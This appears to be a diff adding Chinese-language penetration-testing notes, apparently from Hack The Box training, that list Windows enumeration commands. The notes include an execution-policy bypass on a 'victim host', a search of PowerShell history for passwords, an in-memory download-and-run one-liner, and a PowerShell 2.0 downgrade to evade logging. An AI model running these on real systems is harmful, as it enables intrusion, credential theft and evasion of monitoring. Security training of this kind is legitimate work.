@@ -1,0 +1,29 @@
+CMD
+hostname	                                                打印 PC 的名称
+[System.Environment]::OSVersion.Version	                  打印出操作系统版本和修订级别
+wmic qfe get Caption,Description,HotFixID,InstalledOn     打印应用于主机的补丁和修补程序
+ipconfig /all                                             打印出网络适配器的状态和配置
+set	                                                      显示当前会话的环境变量列表
+echo %USERDOMAIN%	                                        显示主机所属的域名
+echo %logonserver%	                                      打印出主机用于签入的域控制器的名称
+systeminfo                                                ***来涵盖以上所有信息***
+
+
+PS
+Get-Module	                              列出已加载可用的模块
+Get-ExecutionPolicy -List	                将打印出主机上每个作用域的执行策略 (execution policy) 设置
+Set-ExecutionPolicy Bypass -Scope Process	这将使用 -Scope 参数更改我们当前进程的策略。这样做将在我们退出或终止该进程后恢复策略。这是理想的做法，因为我们不会对受害主机进行永久性更改
+Get-ChildItem Env: | ft Key,Value	        返回环境变量值，如密钥路径、用户、计算机信息等
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	获取指定用户的 PowerShell 历史记录，命令历史可能包含密码，或指向包含密码的配置文件或脚本
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	使用 PowerShell 从 Web 下载文件并从内存中调用它的快捷方法
+
+
+PowerShell 事件日志记录是 PowerShell 3.0 及更高版本引入的一个功能
+可以尝试调用 PowerShell 2.0 或更早的版本。如果成功，在该 shell 中的操作将不会被记录在事件查看器中
+记录位于 Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
+C:\htb> powershell.exe -version 2
+
+
+C:\htb> netsh advfirewall show allprofiles      检查防火墙
+C:\htb> sc query windefend                      检查防火墙
+C:\htb> Get-MpComputerStatus                    检查防火墙
